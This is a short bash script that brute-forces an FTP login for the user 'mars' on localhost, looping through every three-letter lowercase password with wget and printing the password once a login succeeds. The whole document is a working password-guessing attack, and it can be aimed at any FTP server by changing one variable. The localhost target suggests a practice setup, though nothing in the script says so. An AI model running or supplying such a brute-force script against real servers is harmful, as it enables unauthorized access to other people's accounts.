#!/bin/bash

user=mars
#pass=
url="localhost"

for pass in {a..z}{a..z}{a..z}
do
wget --ftp-user=${user} --ftp-password=${pass} ftp://${url}  &> /dev/null
	if [ $? -eq 0 ]
	then
		echo "============================="
		echo "${user}'s pass is ${pass}"
		echo "============================="
		exit
	else
		echo "${user}'s pass is not  ${pass}"
	fi
done
echo "pass error"
